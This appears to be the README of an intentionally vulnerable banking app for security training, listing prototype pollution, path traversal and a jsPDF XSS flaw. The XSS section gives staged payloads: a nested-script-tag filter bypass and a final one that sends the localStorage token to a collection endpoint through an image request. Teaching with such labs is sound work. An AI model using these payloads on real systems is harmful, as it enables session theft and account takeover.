# Berkshare Hackaway

Vulnerable applications for educational purposes.

## Security Vulnerabilities

### Prototype Pollution

The banking web application uses a stringified JSON string to store
metadata about memos.

### Path Traversal

In a banking web application we are building, we are going to 
implement a feature that allows customers to create their
financial account statement from the bank. This capability
involves generating a PDF file that contains the customer's 
name. As part of a cybersecurity educational awareness session
we want to theorize a flow in the system that involves a
double encoding security vulnerability in a directory traversal
workflow that relates to the system's ability to generate the
PDF file.


### jsPDF vulnerability

Saving this information as part of the user address could be dangerous

Phase 1: script doesn't work

```html
<script>document.write(window.location);</script>
```

Phase 2: Can we bypass it?? success!

```html
<p id='test'>a</p> <<script>script>document.write(window.location);</</script>script>;
```

Phase 3: script works, but CORS damn it!!

```html
<p id='test'>a</p> <<script>script>fetch('http://example.com');</</script>script>
```

Phase 4: cors be gone!! let's img it

```html
<p id='test'>a</p> <<script>script>var img=new Image();img.src='http://localhost:3005/data?d='+btoa(localStorage.getItem('token'));document.body.appendChild(img);</</script>script>
```